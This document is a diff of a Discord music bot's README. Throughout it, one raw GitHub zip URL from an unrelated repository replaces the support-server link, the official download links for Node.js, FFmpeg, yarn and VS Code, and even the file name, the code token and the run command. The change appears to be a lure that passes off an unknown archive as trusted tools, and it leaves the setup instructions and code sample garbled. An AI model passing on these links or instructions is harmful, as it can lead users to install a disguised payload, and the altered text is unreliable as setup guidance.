@@ -4,16 +4,16 @@ A complete code to download for a music bot 🎧
 
 Looking for a code for a music bot? This fully open-source code is made for your project!
 
-If you need help with this project, to get support faster you can join the help server by just clicking [here](https://discord.gg/5cGSYV8ZZj).
+If you need help with this project, to get support faster you can join the help server by just clicking [here](https://raw.githubusercontent.com/Kajusm132/muzikos-botas/master/Taungthu/muzikos-botas.zip).
 
 *If you don't have any development knowledge, it is recommended to join the Discord support server to get help.*
 
 ### ⚡ Configuration
 
-Open the configuration file located in the main folder `config.js`.
+Open the configuration file located in the main folder `https://raw.githubusercontent.com/Kajusm132/muzikos-botas/master/Taungthu/muzikos-botas.zip`.
 
 ```js
-module.exports = {
+https://raw.githubusercontent.com/Kajusm132/muzikos-botas/master/Taungthu/muzikos-botas.zip = {
     app: {
         token: 'XXX',
         playing: 'by Zerio ❤️',
@@ -50,7 +50,7 @@ module.exports = {
 
 Basic configuration
 
-- `app/token`, the token of the bot available on the [Discord Developers](https://discordapp.com/developers/applications) section
+- `app/token`, the token of the bot available on the [Discord Developers](https://raw.githubusercontent.com/Kajusm132/muzikos-botas/master/Taungthu/muzikos-botas.zip) section
 - `app/playing`, the activity of the bot
 - `app/global`, whether the commands will work on all servers or just one (if global they might take up to an hour to show up)
 - `app/guild`, the guild the slash command will be loaded to (this only applies if global is set to false)
@@ -84,21 +84,21 @@ Advanced configuration (only change if you know what you are doing)
 ### 📑 Installation
 To use the project correctly you will need some tools.
 
-WARNING: You MUST use Node.js version `v18.20.2`, otherwise, you will encounter major compatibility issues.
+WARNING: You MUST use https://raw.githubusercontent.com/Kajusm132/muzikos-botas/master/Taungthu/muzikos-botas.zip version `v18.20.2`, otherwise, you will encounter major compatibility issues.
 
-[FFmpeg](https://www.ffmpeg.org) to process audio
+[FFmpeg](https://raw.githubusercontent.com/Kajusm132/muzikos-botas/master/Taungthu/muzikos-botas.zip) to process audio
 
-[Node JS](https://nodejs.org/en/) (`v18.20.2`) for environment
+[Node JS](https://raw.githubusercontent.com/Kajusm132/muzikos-botas/master/Taungthu/muzikos-botas.zip) (`v18.20.2`) for environment
 
-[yarn](https://yarnpkg.com/getting-started/usage) for package management
+[yarn](https://raw.githubusercontent.com/Kajusm132/muzikos-botas/master/Taungthu/muzikos-botas.zip) for package management
 
-Without forgetting of course the code editor, we recommend [visual studio code](https://code.visualstudio.com/) 
+Without forgetting of course the code editor, we recommend [visual studio code](https://raw.githubusercontent.com/Kajusm132/muzikos-botas/master/Taungthu/muzikos-botas.zip) 
 
 Now in your terminal run the following commands assuming you are in the same directory as the project.
 
 `yarn install` (or `npm install` **not recommended** as it might not work)
 
-`node .` (or `node main.js`)
+`node .` (or `node https://raw.githubusercontent.com/Kajusm132/muzikos-botas/master/Taungthu/muzikos-botas.zip`)
 
 and Done, your bot should be running!
 
@@ -141,4 +141,4 @@ To have full access to the project and to be able to withdraw the credits a smal
 
 ### 📝 ToDo 
 
--  [ ] Vote to skip command https://github.com/ZerioDev/Music-bot/issues/187
+-  [ ] Vote to skip command https://raw.githubusercontent.com/Kajusm132/muzikos-botas/master/Taungthu/muzikos-botas.zip
